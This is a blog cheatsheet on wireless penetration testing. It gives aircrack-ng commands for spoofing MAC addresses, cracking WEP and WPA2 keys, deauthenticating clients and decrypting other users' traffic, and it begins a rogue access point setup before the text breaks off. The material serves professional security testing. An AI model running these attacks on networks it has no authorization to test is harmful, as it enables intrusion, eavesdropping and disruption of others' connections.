---
title: Wireless Penetration Testing Cheatsheet
url: https://www.hackingdream.net/2025/08/wireless-penetration-testing-cheatsheet.html
source: Hacking Dream
date: 2025-08-04
fetch_date: 2025-10-07T00:14:52.161947
---

# Wireless Penetration Testing Cheatsheet

* [Home](http://www.hackingdream.net)
* [About Author](http://www.hackingdream.net/p/about-author.html)
* [Contact US](http://www.hackingdream.net/p/contact-us.html)

[# ![Hacking Dream](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgI3MZul9awsB7xmLlAs9J9xDOsiYxbMQoa4EQkvg9T9oe4q5zkZRqV0W4UN2KhrQQWPLveTvQ9kkuHu2HfrahqY0Gc53G1cVCwQNY2G3MVkEOJoDvLIK9lFtBUc-HhRciiteWdHYV4SaE/s1600/Size-Modified.png)](https://www.hackingdream.net/)

Main menu

close

* [Home](http://www.hackingdream.net)
* [AI Sec](https://www.hackingdream.net/search/label/AI)
* [AI Pentest](http://www.hackingdream.net/search/label/AI%20Attacks)
* [Cheatsheets](https://www.hackingdream.net/search/label/Cheatsheet)
* [Pentest](https://www.hackingdream.net/search/label/Pentest)
* [\_Active Directory](https://www.hackingdream.net/search/label/Active%20Directory)
* [\_Linux](http://www.hackingdream.net/search/label/Kali%20Linux)
* [\_Wireless](http://www.hackingdream.net/search/label/Wifi%20Hacking)
* [\_Target Hacking](http://www.hackingdream.net/search/label/Target%20Hacking)
* [Purple Team](https://www.hackingdream.net/search/label/Purple%20Team)
* [Bin Exp](https://www.hackingdream.net/search/label/Exploitation)
* How To
* [\_Blogging](http://www.hackingdream.net/search/label/Blogging)
* [\_Solved Problems](http://www.hackingdream.net/search/label/Solved%20Problems)
* [\_Money Making](http://www.hackingdream.net/search/label/Money%20Making)
* [\_Top Ten](http://www.hackingdream.net/search/label/Top%20Ten)
* [\_Gaming](http://www.hackingdream.net/search/label/Games)

### Wireless Penetration Testing Cheatsheet

[August 03, 2025](https://www.hackingdream.net/2025/08/wireless-penetration-testing-cheatsheet.html "permanent link")

Wireless Penetration Testing Tutorial: A Command Guide

# Wireless Penetration Testing Cheatsheet

*Updated on Sep 09, 2025*

Welcome to our comprehensive **wireless penetration testing tutorial**. This guide provides a practical command reference for ethical hackers and security professionals. Before proceeding, ensure you have explicit permission to test the target network, as unauthorized access is illegal. These WiFi security testing techniques are for educational and professional purposes only.

[![Wireless Penetration Testing Cheatsheet](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjgyMVKHwtkvuDi3QR4U0PDeX4CrQOyVyGR0ehSE1YvzLYzOmVxo2rePKUXq_SBdjhhnEVUidqWjTThuNQLKyy6TmfRkjDxPCn1HSKr7TWtrQP9M_tLOfeAGMw31oS-vIcM5fGJOHvvXjs9uVhVCFsxpWYCBonPSJ07wexyOyB88nIu_G5VOCr9ptqk8cE/w640-h336/Wireless-Penetration-Testing-Cheatsheet.jpg "Wireless Penetration Testing Cheatsheet")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjgyMVKHwtkvuDi3QR4U0PDeX4CrQOyVyGR0ehSE1YvzLYzOmVxo2rePKUXq_SBdjhhnEVUidqWjTThuNQLKyy6TmfRkjDxPCn1HSKr7TWtrQP9M_tLOfeAGMw31oS-vIcM5fGJOHvvXjs9uVhVCFsxpWYCBonPSJ07wexyOyB88nIu_G5VOCr9ptqk8cE/s768/Wireless-Penetration-Testing-Cheatsheet.jpg)

**Table of Contents**

* [Understanding the Basics: Changing Your MAC Address](#section-1)
* [Cracking WEP Encryption](#section-2)
* [Cracking WPA/WPA2 PSK Encryption](#section-3)
* [Eavesdropping on a Wireless Network](#section-4)
* [Setting up a Rogue Access Point Manually](#section-5)
* [Performing a Man-in-the-Middle (MITM) Attack](#section-6)
* [Executing a Denial of Service (DoS) Attack](#section-7)
* [Testing WPA Enterprise Security](#section-8)

## Understanding the Basics: Changing Your MAC Address

An essential first step in any network assessment is to change your device's MAC address. This helps anonymize your hardware and bypass basic MAC filtering. You can use tools like `macchanger` or the `ifconfig` command.

Using `macchanger`:

```
macchanger -m aa:bb:cc:11:22:33 wlan0
```

Alternatively, use `ifconfig`:

```
ifconfig eth0 down
ifconfig eth0 hw ether aa:bb:cc:11:22:33
ifconfig eth0 up
```

## Cracking WEP Encryption

WEP (Wired Equivalent Privacy) is an outdated and insecure protocol. Cracking it involves collecting a sufficient number of weak Initialization Vectors (IVs) using the Aircrack-ng suite, an essential toolset covered in many [Wifi Hacking tutorials](https://www.hackingdream.net/2016/09/how-to-hack-wifi-password-easily.html).

1. **Start Monitor Mode:** Put your wireless card into monitor mode to capture all traffic.

   ```
   airmon-ng start wlan0
   ```
2. **Discover Networks:** Scan for available wireless networks to identify your target's BSSID and channel.

   ```
   airodump-ng wlan0mon
   ```
3. **Capture IV Packets:** Focus on the target network and save the captured packets to a file. Do not close this terminal.

   ```
   airodump-ng --bssid 00:11:22:33:44:55 -c 1 -w PacketCapture wlan0mon
   ```
4. **Crack the Password:** Once enough data packets (IVs) are collected, use aircrack-ng to analyze the capture file and reveal the key.

   ```
   aircrack-ng PacketCapture*.cap
   ```

## Cracking WPA/WPA2 PSK Encryption

WPA/WPA2 with a Pre-Shared Key (PSK) is significantly more secure than WEP. The primary attack vector is to capture the four-way **WPA2 handshake** that occurs when a client authenticates. This process is a core component of any modern wireless penetration testing exercise.

1. **Stop Network Services:** Prevent interference from your system's network manager.

   ```
   service network-manager stop
   ```
2. **Start Monitor Mode:**

   ```
   airmon-ng start wlan0
   ```
3. **Discover Networks:**

   ```
   airodump-ng wlan0mon
   ```
4. **Capture the Handshake:** Target the specific network and wait for a "WPA handshake" message to appear in the top right of the terminal.

   ```
   airodump-ng --bssid 00:11:22:33:44:55 -c 1 -w wpadump wlan0mon
   ```
5. **Force Re-authentication (Optional):** To speed up the process, you can de-authenticate a connected client, forcing them to reconnect and generate a new handshake.

   ```
   aireplay-ng --deauth 50 -a [router_MAC_Address] -c [Victim_MAC_Station] wlan0mon
   ```
6. **Crack the Password:** Once the handshake is captured, stop airodump-ng (`Ctrl+C`) and run an offline dictionary attack against the capture file.

   ```
   aircrack-ng -w wordlist.txt wpadump*.cap
   ```

For more details on network protocols, you can consult resources from the [IEEE](https://www.ieee.org/). Additionally, you can [learn more about captive portal pentesting](https://www.hackingdream.net/2022/08/hacking-and-pentesting-captive-portal-wifi.html) techniques on our blog.

## Eavesdropping on a Wireless Network

If you already have the network password, you can decrypt live traffic to see the data being transmitted by other users on the network.

1. **Kill Conflicting Processes:** Use `airmon-ng check kill` to stop any processes that might interfere with monitor mode.

   ```
   airmon-ng check kill
   airmon-ng start wlan0
   ```
2. **Capture Encrypted Data:** Use airodump-ng to capture a large amount of data from the target network.

   ```
   airodump-ng --bssid 00:11:22:33:44:55 --channel [Channel_Number] -w wpadump wlan0mon
   ```
3. **Decrypt the Traffic:** Use `airdecap-ng` with the known network password to decrypt the packet capture file.

   For WEP (key must be in hexadecimal):

   ```
   airdecap-ng -w [WEP_Password_in_Hex] wepdump.cap
   ```

   For WPA/WPA2:

   ```
   airdecap-ng -p [WPA_Password] wpadump.cap
   ```
4. **Analyze Traffic:** Open the newly created `WPAdump-dec.cap` file in Wireshark to analyze the decrypted traffic.

## Setting up a Rogue Access Point Manually

A **Rogue Access Point setup** creates a malicious Wi-Fi network that appears legitimate, tricking users into connecting. This allows an attacker to intercept or manipulate their traffic.

1. **Enable Monitor Mode and Assign IP:**

   ```
   airmon-ng start wlan0
   ifconfig wlan0mon 10.0.0.1/24
   ```
2. **Install Required Tools:**

   ```
   sudo apt-get install -y hostapd dnsmasq wireless-tools iw wvdial
   ```
3. **Configure `dnsmasq`:** Backup the original file and create a new one to act as our DHCP and DNS ...